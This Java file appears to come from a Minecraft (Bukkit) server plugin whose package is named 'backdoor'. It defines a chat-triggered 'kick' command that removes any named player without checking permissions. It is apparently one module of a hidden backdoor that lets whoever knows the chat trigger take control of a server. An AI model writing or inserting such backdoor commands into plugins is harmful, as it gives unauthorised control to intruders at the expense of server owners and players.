package me.thesaltyboys.backdoor.commands.bans;

import me.thesaltyboys.backdoor.Command;
import me.thesaltyboys.backdoor.RegisterCommand;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "kick", aliases = {"kick"})
public class KickCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getPlayer(args.get(0));

            StringBuilder sb = new StringBuilder();
            for (int i = 1; i < args.size(); i++) {
                sb
                        .append(args.get(i))
                        .append(" ");
            }

            target.kickPlayer(sb.toString());
        }
    }
}
